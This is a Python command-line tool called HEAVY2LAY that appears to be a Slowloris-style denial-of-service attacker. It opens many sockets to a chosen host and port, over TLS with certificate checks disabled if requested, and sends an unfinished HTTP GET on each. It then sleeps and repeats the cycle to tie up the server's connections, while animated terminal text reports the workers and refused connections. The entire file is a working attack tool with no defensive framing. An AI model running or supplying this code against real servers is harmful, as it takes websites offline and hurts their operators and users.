#!/usr/bin/python3
import parse
import sys
import out
import threading
import time
import socket
import platform
import ssl
import config

cleanout_lite = '                    \x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D'
cleanout = cleanout_lite

cleanout_lite = ''
windows = True if platform.system() == 'Windows' else False
if windows:
    out.p('ATTENTION: You\'re running HEAVY2LAY on Windows. Animations and colors work incorrectly')
    cleanout_lite = '                    '
else:
    cleanout_lite = '                    \x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D\x1b[D'

cleanout = cleanout_lite
symbols = [
    '>>>>', ' >>>', '> >>', '>> >', '>>> '
]
animworks = False
animtext = 'WARNING: NO ANIMATION TEXT'
def animation():
    s = 0
    while True:
        if not animworks:
            break
        if not windows:
            out.p(f'\r\x1b[3;31m{symbols[s]}\x1b[0m {animtext}', end='')
        else:
            out.p(f'\r{symbols[s]} {animtext}', end='')
        time.sleep(0.1)
        s += 1
        if s == len(symbols):
            s = 0

parser = parse.Parser(sys.argv)
parser.add_arg('help', '--help', xtype=parse.T_BOOL)
parser.add_arg('host', '-h', xtype=parse.T_STRING)
parser.add_arg('port', '-p', xtype=parse.T_INT)
parser.add_arg('sockets', '-s', xtype=parse.T_INT, default=100)
parser.add_arg('https', '--https', xtype=parse.T_BOOL)
parser.add_arg('sleeptime', '-S', xtype=parse.T_INT, default=15)
args = parser.parse()

if args['help'] == True:
    out.p(config.msg_help)
    sys.exit(0)

# if None in [args['host'], args['port']]:
if args['host'] == None:
    out.error('You skipped an required argument')
    sys.exit(1)

if args['port'] == None:
    args['port'] = 80 if not args['https'] else 443

# animtext = f'ATTACK WORKS ON {args["host"]}:{args["port"]}'
loop_amount = 0
animtext = 'Starting workers'
animworks = True
animthread = threading.Thread(target=animation)
animthread.start()
sleeping = -1
alive_sockets = []
refused = 0
while True:
    stop_creating = False
    try:
        if sleeping == -1:
            loop_amount += 1
            refused = 0
            for _ in range(args['sockets']):
                animtext = f'CREATING WORKER {_+1}/{args["sockets"]}{" / REFUSED x" + str(refused) if refused > 0 else ""}{cleanout}'
                if stop_creating == False:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        sock.settimeout(3)
                        if args['https'] == True:
                            ctx = ssl.create_default_context()
                            ctx.check_hostname = False
                            ctx.verify_mode = ssl.CERT_NONE
                            sock = ctx.wrap_socket(sock, server_hostname=args['host'])
                    except OSError as e:
                        out.error(f'OSError catched: {e}{cleanout}', left='\r')
                        sock.close()
                        stop_creating = True
                        refused += args['sockets'] - len(alive_sockets)
                        continue
                    try:
                        sock.connect((args['host'], args['port']))
                    except ConnectionRefusedError:
                        # out.error('Connection Refused')
                        refused += 1
                        # animtext = f'CONNECTION REFUSED ERROR CATCHED ON WORKER {_+1}/{args["sockets"]}'
                        continue
                    except Exception as e:
                        out.error(f'Exception: {e}                         ', left='\r')
                        refused += 1
                        continue
                    alive_sockets.append(sock)
                    sock.send(f'GET / HTTP/1.1'.encode())
            sleeping = 0
        else:
            animtext = f'SLEEPING ({sleeping}/{args["sleeptime"]}) (LOOP #{loop_amount}) x{len(alive_sockets)} WORKERS{" / REFUSED x" + str(refused) if refused > 0 else ""}{cleanout}'
            time.sleep(1)
            sleeping += 1
            if sleeping == args['sleeptime']:
                donetext = ''
                if refused == 0:
                    donetext = '\x1b[42mDONE  '
                elif refused > 0 and not len(alive_sockets) == 0:
                    donetext = '\x1b[43mDONE  '
                else:
                    donetext = '\x1b[41mREFUSE'
                print(f'\r{donetext}\x1b[0m LOOP #{loop_amount} x{len(alive_sockets)} WORKERS{" / REFUSED x" + str(refused) if refused > 0 else ""}{cleanout}')
                sleeping = -1
                alive_sockets = []
    except KeyboardInterrupt:
        animworks = False
        i = 0
        for sock in alive_sockets:
            i += 1
            animtext = f'Closing socket {i}/{len(alive_sockets)}'
            sock.close()
        out.warn('Keyboard Interrupt catched!                            ', left='\r')
        sys.exit(0)
